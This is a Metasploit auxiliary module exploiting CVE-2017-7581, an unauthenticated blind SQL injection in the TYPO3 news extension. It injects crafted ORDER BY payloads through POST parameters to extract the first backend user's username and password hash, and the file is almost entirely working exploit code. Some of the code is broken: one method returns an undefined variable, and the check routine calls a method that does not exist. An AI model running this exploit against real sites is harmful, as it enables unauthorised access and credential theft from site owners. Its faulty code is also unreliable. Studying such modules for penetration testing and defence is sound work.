##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'TYPO3 News Module SQL Injection',
      'Description'    => %q{
         This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php
         in the news module 5.3.2 and earlier, allows unauthenticated user to execute arbitrary
         SQL commands via vectors involving overwriteDemand for order and OrderByAllowed.
         This essentially means an attacker can obtain user credentials hashes.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Charles Fol', # initial discovery, POC
          'Marco Rivoli <marco.rivoli.nvh<at>gmail.com>' #MSF code
        ],
      'References'     =>
        [
          [ 'CVE', '2017-7581'  ],
          [ 'URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli' ], # Advisory
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Apr 6 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/typo3/']),
        OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
        OptString.new('PATTERN1', [true, 'Pattern of the first article', 'Article #1']),
        OptString.new('PATTERN2', [true, 'Pattern of the first article', 'Article #2'])
      ])
  end

  def check
    # the only way to test if the target is vuln
    if test_injection
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def dump_the_hash
    ascii_charset_lower = "a".upto("z").to_a.join('')
    ascii_charset_upper = "A".upto("Z").to_a.join('')
    ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
    digit_charset = "0".upto("9").to_a.join('')

    full_charset = "#{ascii_charset_lower}#{ascii_charset_upper}#{digit_charset}$./"
    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset)
    print_good("Username: #{username}")
    password = blind('password','be_users', 'uid=1', full_charset, digit_charset)
    print_good("Password Hash: #{password}")
    return [username, password]
  end

  def blind(field, table, condition, charset, digit_charset)
    size = blind_size(
     "length(#{field})+9",
     table,
     condition,
     2,
     digit_charset
    )
    size = size.to_i - 9
    data = blind_size(
     field,
     table,
     condition,
     size,
     charset
    )
    return data
  end

  def select_position(field, table, condition, position, char)
    payload1 = "select(#{field})from(#{table})where(#{condition})"
    payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
    payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
    return payload3
  end

  def blind_size(field, table, condition, size, charset)
    str = ""
    for position in 0..size
      for char in charset.split('')
        payload = select_position(field, table, condition, position + 1, char)
        #print_status(payload)
        if test(payload)
          str += char.to_s
          #print_status(str)
          break
        end
      end
    end
    return string
  end

  def test(payload)
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path,'index.php'),
      'vars_get' => {
        'id' => datastore['ID'],
        'no_cache' => '1'
       },
       'vars_post' => {
         'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
         'tx_news_pi1[search][maximumDate]' => '2017-12-31',
         'tx_news_pi1[overwriteDemand][order]' => payload,
         'tx_news_pi1[search][subject]' => '',
         'tx_news_pi1[search][minimumDate]' => '2017-01-01'
       },
    })
    pattern1 = datastore['PATTERN1']
    pattern2 = datastore['PATTERN2']
    return res.body.index(pattern1) < res.body.index(pattern2)
  end

  def run
    print_status("Dumping the username and password hash...")
    dump_the_hash
  end
end
